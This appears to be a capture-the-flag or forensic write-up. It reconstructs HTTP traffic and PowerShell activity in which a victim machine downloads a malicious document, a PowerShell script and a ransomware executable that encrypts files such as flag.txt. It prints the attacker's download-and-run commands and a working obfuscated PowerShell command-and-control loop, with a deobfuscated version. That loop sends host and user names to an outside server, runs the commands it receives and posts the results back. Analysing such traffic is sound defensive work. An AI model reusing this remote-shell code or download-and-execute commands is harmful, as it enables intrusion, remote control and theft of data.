| No  | Time                      | Source        | Destination     | Protocol | Length | Info                                            |
|-----|---------------------------|---------------|-----------------|----------|--------|-------------------------------------------------|
| 4   | 2024-04-29 17:01:02.424191| 10.0.2.15     | 172.233.245.47  | HTTP     | 463    | GET /evil.odt HTTP/1.1                          |
| 16  | 2024-04-29 17:01:02.444894| 172.233.245.47| 10.0.2.15       | HTTP     | 1026   | HTTP/1.0 200 OK (application/vnd.oasis.opendocument.text) |
| 41  | 2024-04-29 17:01:09.175562| 10.0.2.15     | 172.233.245.47  | HTTP     | 128    | GET /rshell.ps1 HTTP/1.1                        |
| 44  | 2024-04-29 17:01:09.185433| 172.233.245.47| 10.0.2.15       | HTTP     | 753    | HTTP/1.0 200 OK                                 |
| 52  | 2024-04-29 17:01:09.751407| 10.0.2.15     | 172.233.245.47  | HTTP     | 283    | GET /35b503/DESKTOP-QS9TQJ6/alfred HTTP/1.1     |
| 56  | 2024-04-29 17:01:09.760867| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/javascript)               |
| 63  | 2024-04-29 17:01:09.799216| 10.0.2.15     | 172.233.245.47  | HTTP     | 260    | GET /6f7bab HTTP/1.1                            |
| 66  | 2024-04-29 17:01:09.809726| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/javascript)               |
| 469 | 2024-04-29 17:01:21.105335| 10.0.2.15     | 172.233.245.47  | HTTP     | 222    | GET /Backup.exe HTTP/1.1                         |
| 676 | 2024-04-29 17:01:21.165794| 172.233.245.47| 10.0.2.15       | HTTP     | 554    | HTTP/1.0 200 OK (application/x-msdos-program)   |
| 687 | 2024-04-29 17:01:21.327675| 10.0.2.15     | 172.233.245.47  | HTTP     | 329    | POST /a17472 HTTP/1.1                           |
| 690 | 2024-04-29 17:01:21.337967| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/plain)                    |
| 697 | 2024-04-29 17:01:22.360039| 10.0.2.15     | 172.233.245.47  | HTTP     | 260    | GET /6f7bab HTTP/1.1                            |
| 700 | 2024-04-29 17:01:22.369993| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/javascript)               |
| 752 | 2024-04-29 17:01:26.918743| 10.0.2.15     | 23.214.205.2    | HTTP     | 281    | GET / HTTP/1.1                                  |
| 754 | 2024-04-29 17:01:26.944501| 23.214.205.2  | 10.0.2.15       | HTTP     | 317    | HTTP/1.1 304 Not Modified                       |
| 758 | 2024-04-29 17:01:26.960238| 10.0.2.15     | 95.100.133.156  | HTTP     | 336    | GET /msdownload/update/v3/static/trustedr/en/authrootstl.cab?e501b8abfc88632c HTTP/1.1 |
| 760 | 2024-04-29 17:01:26.970012| 95.100.133.156| 10.0.2.15       | HTTP     | 322    | HTTP/1.1 304 Not Modified                       |
| 766 | 2024-04-29 17:01:27.470652| 10.0.2.15     | 172.233.245.47  | HTTP     | 260    | GET /6f7bab HTTP/1.1                            |
| 769 | 2024-04-29 17:01:27.480563| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/javascript)               |
| 802 | 2024-04-29 17:01:29.613179| 10.0.2.15     | 172.233.245.47  | HTTP     | 1380   | POST /a17472 HTTP/1.1 (application/x-www-form-urlencoded) |
| 806 | 2024-04-29 17:01:29.623602| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/plain)                    |
| 813 | 2024-04-29 17:01:30.640539| 10.0.2.15     | 172.233.245.47  | HTTP     | 260    | GET /6f7bab HTTP/1.1                            |
| 816 | 2024-04-29 17:01:30.650458| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/javascript)               |
| 866 | 2024-04-29 17:01:34.858748| 10.0.2.15     | 172.233.245.47  | HTTP     | 1186   | POST /a17472 HTTP/1.1 (application/x-www-form-urlencoded) |
| 870 | 2024-04-29 17:01:34.869118| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/plain)                    |
| 879 | 2024-04-29 17:01:35.881230| 10.0.2.15     | 172.233.245.47  | HTTP     | 260    | GET /6f7bab HTTP/1.1                            |
| 882 | 2024-04-29 17:01:35.892206| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/javascript)               |
| 1050| 2024-04-29 17:01:43.182040| 10.0.2.15     | 172.233.245.47  | HTTP     | 931    | POST /a17472 HTTP/1.1 (application/x-www-form-urlencoded) |
| 1054| 2024-04-29 17:01:43.192272| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/plain)                    |
| 1061| 2024-04-29 17:01:44.216835| 10.0.2.15     | 172.233.245.47  | HTTP     | 260    | GET /6f7bab HTTP/1.1                            |
| 1064| 2024-04-29 17:01:44.226917| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/javascript)               |
| 1232| 2024-04-29 17:01:57.696368| 10.0.2.15     | 172.233.245.47  | HTTP     | 381    | POST /a17472 HTTP/1.1 (application/x-www-form-urlencoded) |
| 1236| 2024-04-29 17:01:57.706307| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/plain)                    |
| 1243| 2024-04-29 17:01:58.712596| 10.0.2.15     | 172.233.245.47  | HTTP     | 260    | GET /6f7bab HTTP/1.1                            |
| 1246| 2024-04-29 17:01:58.722944| 172.233.245.47| 10.0.2.15       | HTTP     | 60     | HTTP/1.0 200 OK (text/javascript)               |


iwr http://172.233.245.47/Backup.exe -o \Users\alfred\AppData\Local\Temp\backup.exe
gci \Users\alfred\AppData\Local\Temp\backup.exe
Get-FileHash \Users\alfred\AppData\Local\Temp\backup.exe
\Users\alfred\AppData\Local\Temp\backup.exe
del \Users\alfred\AppData\Local\Temp\backup.exe
gci \Users\alfred\AppData\Local\Temp\backup.exe

Directory: C:\Users\alfred\AppData\Local\Temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/29/2024   7:01 PM         256512 backup.exe


Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          A3B923CCDA536816546FBD7E864384C32642090F494AE0C136B727412CF2C6DC       C:\Users\alfred\AppData\Local...


[*] encrypting file: "\\Users\\alfred\\Documents\\flag.txt"
[*] encrypting file: "\\Users\\alfred\\Pictures\\armor.jpg"
[*] encrypting file: "\\Users\\alfred\\Pictures\\links.jpg"
[*] encrypting file: "\\Users\\alfred\\Pictures\\server.png"


Cannot find path 'C:\Users\alfred\AppData\Local\Temp\backup.exe' because it does not exist.

| No  | Time                      | Source        | Destination     | Protocol | Length | Info                                            |
|-----|---------------------------|---------------|-----------------|----------|--------|-------------------------------------------------|
| 4   | 2024-04-29 17:01:02.424191| 10.0.2.15     | 172.233.245.47  | HTTP     | 463    | GET /evil.odt HTTP/1.1                          |
| 41  | 2024-04-29 17:01:09.175562| 10.0.2.15     | 172.233.245.47  | HTTP     | 128    | GET /rshell.ps1 HTTP/1.1                        |                             |


```powershell
iwr http://172.233.245.47/Backup.exe -o
```

| No  | Time                      | Source        | Destination     | Protocol | Length | Info                                            |
|-----|---------------------------|---------------|-----------------|----------|--------|-------------------------------------------------|
| 469 | 2024-04-29 17:01:21.105335| 10.0.2.15     | 172.233.245.47  | HTTP     | 222    | GET /Backup.exe HTTP/1.1                        |
| 676 | 2024-04-29 17:01:21.165794| 172.233.245.47| 10.0.2.15       | HTTP     | 554    | HTTP/1.0 200 OK (application/x-msdos-program)   |

```powershell
gci \Users\alfred\AppData\Local\Temp\backup.exe
```

Directory: C:\Users\alfred\AppData\Local\Temp
| Mode   | LastWriteTime       | Length | Name       |
|--------|---------------------|--------|------------|
| -a---- | 4/29/2024   7:01 PM | 256512 | backup.exe |

```powershell
Get-FileHash \Users\alfred\AppData\Local\Temp\backup.exe
```

| Algorithm | Hash | Path |
|-----------|------|------|
| SHA256 | A3B923CCDA536816546FBD7E864384C32642090F494AE0C136B727412CF2C6DC | C:\Users\alfred\AppData\Local... |

```powershell
\Users\alfred\AppData\Local\Temp\backup.exe
```

```markdown
[*] encrypting file: "\\Users\\alfred\\Documents\\flag.txt"
[*] encrypting file: "\\Users\\alfred\\Pictures\\armor.jpg"
[*] encrypting file: "\\Users\\alfred\\Pictures\\links.jpg"
[*] encrypting file: "\\Users\\alfred\\Pictures\\server.png"
```

```powershell
del \Users\alfred\AppData\Local\Temp\backup.exe
```

```powershell
gci \Users\alfred\AppData\Local\Temp\backup.exe
```

Cannot find path 'C:\Users\alfred\AppData\Local\Temp\backup.exe' because it does not exist.



Documents
Pictures
Downloads
Desktop

.docx
.txt
.png
.jpg
.jpeg

sTAR'T-prO'ceSS $PSHOME\powershell.exe -arGUmeNtLISt {$8241b7="None";$b85ef='17'+'2.233.245.47:80'+'80';$b5e0f='35b503-6f7b'+'a'+'b-a1'+'74'+'72';$585e='http'+':'+'/'+'/';$f0=i'RM' -USeBAsIcpARsInG -urI $585e$b85ef/35b503/$env:CoMPUTeRNaMe/$env:USerName -HEaDERs @{"Authorization"=$b5e0f};for (;;){$f=(i'RM' -USeBAsIcpARsInG -urI $585e$b85ef/6f7bab -HEaDERs @{"Authorization"=$b5e0f});if ($f -nE ('None')) {$c51eb=I'eX' $f -ErRoRAcTIoN s'TOP' -eRRORvAriABLE ec7236;$c51eb=OuT-s'tri'Ng -iNPutoBJeCt $c51eb;$7ab71=i'RM' -urI $585e$b85ef/a17472 -methOd POST -HEaDERs @{"Authorization"=$b5e0f} -body ([sYstem.TEXt.EncODiNG]::utF8.geTbyTes($ec7236+$c51eb) -JoIn ' ')} s'lEe'p 0.8}} -WIndowStYlE H'IDD'EN

START-process $PSHOME\powershell.exe -argumentlist {
    $none = "None"
    $server = '172.233.245.47:8080'
    $auth_key = '35b503-6f7bab-a17472'
    $protocol = 'http://'
    $response = Invoke-WebRequest -UseBasicParsing 
    -Uri "$protocol$server/35b503/$env:COMPUTERName/$env:UserName" 
    -Headers @{"Authorization"= $auth_key}
   
    for (;;) {
        $response = Invoke-WebRequest -UseBasicParsing 
        -Uri "$protocol$server/6f7bab" 
        -Headers @{"Authorization"= $auth_key}
       
        if ($response -ne $none) {
            $output = Invoke-Expression $response -ErrorAction Stop -ErrorVariable ec7236
            $output -OutString | foreach {
                $request = Invoke-WebRequest -UseBasicParsing -Uri "$protocol$server/a17472" 
                -Method POST -Headers @{"Authorization"= $auth_key} 
                -Body ([System.Text.Encoding]::UTF8.GetBytes($ec7236 + $_) -Join ' ')
            }
        }
       
        Start-Sleep -Seconds 0.8
    }
} -WindowStyle Hidden
